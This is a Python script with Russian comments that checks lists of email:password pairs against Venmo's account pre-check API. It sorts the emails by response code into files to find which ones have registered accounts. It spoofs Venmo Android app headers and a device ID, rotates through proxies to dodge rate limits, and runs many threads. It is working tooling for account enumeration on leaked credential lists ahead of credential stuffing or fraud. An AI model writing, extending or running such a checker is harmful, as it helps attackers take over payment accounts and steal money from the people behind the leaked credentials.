import json
import requests
import threading
import queue
import signal
import sys
import os
from typing import Optional, Dict, List

# Конфигурация
INPUT_FILE = "data/emails.txt"  # Файл с email:pass
PROXY_FILE = "data/proxy.txt"  # Файл с прокси (опционально)
OUTPUT_FILE_1 = "data/1.txt"  # Успешные ответы
OUTPUT_FILE_2 = "data/2.txt"  # Ответы с ошибкой 422
RETRY_FILE = "data/retry.txt"  # Запросы для повторной проверки
REMAINS_FILE = "data/remains.txt"  # Остаток данных при остановке
THREADS = 1 # Количество потоков
REQ_URL = "https://api.venmo.com/v1/account/pre-check"  # URL для проверки

# Отношение респонсов к файлам
RESPONSES_FOR_FILE_1 = (200,)
RESPONSES_FOR_FILE_2 = (422,)

# Очередь для email:pass
email_queue = queue.Queue()
# Флаг для остановки потоков
stop_flag = False

# Заголовки запроса
HEADERS = {
    "Accept": "application/json",
    "Accept-Language": "fr-FR",
    "Device-Id": "14c5c255-9661-467d-958f-d651d91ff140",
    "X-Venmo-Android-Version-Name": "8.17.2",
    "X-Venmo-Android-Version-Code": "2321",
    "Application-Id": "com.venmo",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

# Прокси (если есть)
proxies = []


def load_proxies():
    """Загружает прокси из файла."""
    global proxies
    try:
        with open(PROXY_FILE, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
            if len(proxies) == 0:
                print("Прокси не найдены. Работа без прокси")
            else:
                print(f"Прокси найдены. Работа с прокси")
            proxies.append(None)
    except FileNotFoundError:
        print("Файл с прокси не найден. Работа без прокси.")


def load_emails():
    """Загружает email:pass из файла в очередь."""
    try:
        with open(INPUT_FILE, "r") as f:
            for line in f:
                email, password = line.strip().split(":", 1)
                email_queue.put((email, password))
    except FileNotFoundError:
        print(f"Файл {INPUT_FILE} не найден.")
        sys.exit(1)


def save_result(email: str, password: str, response: requests.Response):
    """Сохраняет результат в соответствующий файл."""
    if response.status_code in RESPONSES_FOR_FILE_1:
        with open(OUTPUT_FILE_1, "a") as f:
            f.write(get_response_string(response, f"{email}:{password}"))
    elif response.status_code in RESPONSES_FOR_FILE_2:
        with open(OUTPUT_FILE_2, "a") as f:
            f.write(get_response_string(response, f"{email}:{password}"))
    else:
        with open(RETRY_FILE, "a") as f:
            f.write(get_response_string(response, f"{email}:{password}"))

def get_response_string(response: requests.Response, *data):
    """Возвращает строковое представление ответа."""
    response_string = f"HTTP {response.status_code} {response.reason}\n"
    for header, value in response.headers.items():
        response_string += f"{header}: {value}\n"
    try:
        response_string += f"{response.json()}\n"
    except:
        response_string += "Не удалось получить данные\n"
    for el in data:
        response_string += f"{el}\n"
    return response_string + "\n"

def worker():
    """Функция для работы потока."""
    global stop_flag
    while not stop_flag and not email_queue.empty():
        try:
            email, password = email_queue.get()
            proxy = proxies.pop(0) if proxies else None
            proxies.append(proxy) if proxy else None
            print(f"Запуск через прокси: {proxy} email: {email}")

            data = {"data": {"email": email}}
            try:
                response = requests.post(
                    REQ_URL,
                    headers=HEADERS,
                    json=data,
                    proxies={"http": proxy, "https": proxy} if proxy else None,
                    timeout=10,
                )
                save_result(email, password, response)
            except requests.RequestException as e:
                print(f"Ошибка запроса для {email}: {e}")
                email_queue.put((email, password))  # Повторная попытка
        except Exception as e:
            print(f"Ошибка в потоке: {e}")
        finally:
            email_queue.task_done()


def signal_handler(sig, frame):
    """Обработчик сигнала для остановки программы."""
    global stop_flag
    print("\nОстановка программы...")
    stop_flag = True
    save_remains()


def save_remains():
    """Сохраняет оставшиеся email:pass в файл."""
    with open(REMAINS_FILE, "w") as f:
        while not email_queue.empty():
            email, password = email_queue.get()
            f.write(f"{email}:{password}\n")


def main():
    global THREADS
    global REQ_URL
    # Загрузка данных
    print(os.getcwd())
    load_proxies()
    load_emails()


    threads = input("Напишите количество потоков: ").strip()
    if not threads.isdigit() or int(threads) <= 0:
        print("Некорректное число потоков. Запуск в одном потоке")
    else:
        THREADS = int(threads)
    
    REQ_URL = input("Напишите URL для запроса: ").strip()

    # Обработка сигнала для остановки
    signal.signal(signal.SIGINT, signal_handler)

    # Запуск потоков
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    # Ожидание завершения работы потоков
    for t in threads:
        t.join()

    print("Работа завершена.")


if __name__ == "__main__":
    main()
